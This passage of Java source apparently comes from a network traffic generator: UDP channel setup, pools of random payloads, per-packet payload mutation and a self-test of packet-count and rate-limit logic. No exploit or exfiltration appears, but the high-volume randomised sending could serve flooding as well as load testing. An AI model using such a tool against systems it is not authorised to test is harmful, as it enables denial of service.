                if (Thread.currentThread().isInterrupted()) return SendResult.INTERRUPTED;
                stats.recordError("other", tag, e.getClass().getSimpleName()
                        + " (" + e.getMessage() + ")");
            }
            attempt++;
        }
        return SendResult.FAILED;
    }

    // ==================== UDP channel ====================
    static DatagramChannel openUdpChannel(InetAddress bindAddr, int bindPort,
                                            String tag, Stats stats) throws IOException {
        DatagramChannel channel = DatagramChannel.open();
        channel.configureBlocking(true);
        DatagramSocket socket = channel.socket();
        try {
            socket.setReuseAddress(true);
            try { socket.setSendBufferSize(4 * 1024 * 1024); }
            catch (SocketException ignored) { }
        } catch (SocketException ignored) { }
        if (bindAddr != null || bindPort > 0) {
            try {
                InetAddress addr = bindAddr != null ? bindAddr : InetAddress.getByName("0.0.0.0");
                socket.bind(new InetSocketAddress(addr, bindPort));
            } catch (BindException e) {
                stats.recordError("bind", tag, bindAddr + ":" + bindPort + " - " + e.getMessage());
            }
        }
        return channel;
    }

    // ==================== payload helpers ====================
    static List<byte[]> buildVariantPool(int baseSize, int poolSize, boolean vary, Random rnd) {
        List<byte[]> pool = new ArrayList<>(poolSize);
        if (!vary) {
            byte[] one = new byte[baseSize];
            rnd.nextBytes(one);
            pool.add(one);
            return pool;
        }
        int delta = Math.max(1, baseSize / 10);
        for (int i = 0; i < poolSize; i++) {
            int len = baseSize - delta + rnd.nextInt(delta * 2 + 1);
            if (len < MIN_PAYLOAD) len = MIN_PAYLOAD;
            if (len > MAX_PAYLOAD) len = MAX_PAYLOAD;
            byte[] p = new byte[len];
            rnd.nextBytes(p);
            pool.add(p);
        }
        return pool;
    }

    static void mutatePayload(byte[] payload, long counter, Random rnd) {
        int n = payload.length;
        if (n >= 8) {
            long c = counter;
            for (int b = 0; b < 8; b++) {
                payload[n - 1 - b] = (byte)(c & 0xFF);
                c >>>= 8;
            }
        }
        if (n >= 24) {
            for (int b = 0; b < 16; b++) {
                int idx = 4 + b;
                payload[idx] ^= (byte) rnd.nextInt(256);
            }
        }
    }

    // ==================== selftest ====================
    static boolean runSelfTest() {
        System.out.println("[selftest] running...");
        int failed = 0;

        // --- Test 1: finalizeConfig clamps packetSize ---
        Config c = new Config();
        c.packetSize = 1;
        c.gb = 1.0;
        c.useTcp = false;
        finalizeConfig(c);
        if (c.packetSize != MIN_PAYLOAD) { failed++; System.err.println("FAIL: size clamp lower"); }

        c = new Config();
        c.packetSize = 999_999;
        c.gb = 1.0;
        finalizeConfig(c);
        if (c.packetSize != MAX_PAYLOAD) { failed++; System.err.println("FAIL: size clamp upper"); }

        // --- Test 2: totalPackets uses wire size ---
        c = new Config();
        c.packetSize = 100;
        c.gb = 1.0;
        c.useTcp = false;
        finalizeConfig(c);
        long expected = (long)(1L * 1024 * 1024 * 1024) / (100 + IP_HEADER_LEN + UDP_HEADER_LEN);
        if (c.totalPackets != expected) {
            failed++; System.err.println("FAIL: totalPackets math, got " + c.totalPackets + " expected " + expected);
        }

        // --- Test 3: isValue for negatives ---
        if (!isValue("-1", "-s")) { failed++; System.err.println("FAIL: -s -1 should parse"); }
        if (isValue("-foo", "-s")) { failed++; System.err.println("FAIL: -s -foo should reject"); }
        if (isValue("-1", "--log")) { failed++; System.err.println("FAIL: --log -1 should reject"); }
        if (!isValue("regular", "--log")) { failed++; System.err.println("FAIL: --log regular should accept"); }

        // --- Test 4: Strict attempts cap via CAS ---
        Stats s = new Stats();
        int reserved = 0;
        for (int i = 0; i < 1000; i++) {
            if (s.reserveAttempt(100)) reserved++;
        }
        if (reserved != 100) { failed++; System.err.println("FAIL: reserveAttempt cap, got " + reserved); }
        if (s.attempts.get() != 100) { failed++; System.err.println("FAIL: attempts != 100"); }

        // --- Test 5: GlobalRateLimiter with extreme rateLimit ---
        // Do not actually wait; just verify no exception is thrown
        try {
            GlobalRateLimiter g = new GlobalRateLimiter(1_000_000.0, 50);
            if (g.tokensPerSecond <= 0) { failed++; System.err.println("FAIL: tokensPerSecond <= 0"); }
        } catch (Exception e) {
            failed++; System.err.println("FAIL: GlobalRateLimiter construction: " + e.getMessage());
        }

        // --- Test 6: payload pool sizes are within bounds ---
        Random rnd = new Random(42);
        List<byte[]> pool = buildVariantPool(1000, 10, true, rnd);
        for (byte[] p : pool) {
            if (p.length < MIN_PAYLOAD || p.length > MAX_PAYLOAD) {
                failed++; System.err.println("FAIL: payload out of bounds: " + p.length);
                break;
            }
        }

        if (failed == 0) {
            System.out.println("[selftest] all tests passed");
            return true;
        }
        System.err.println("[selftest] " + failed + " test(s) failed");
        return false;
    }
}
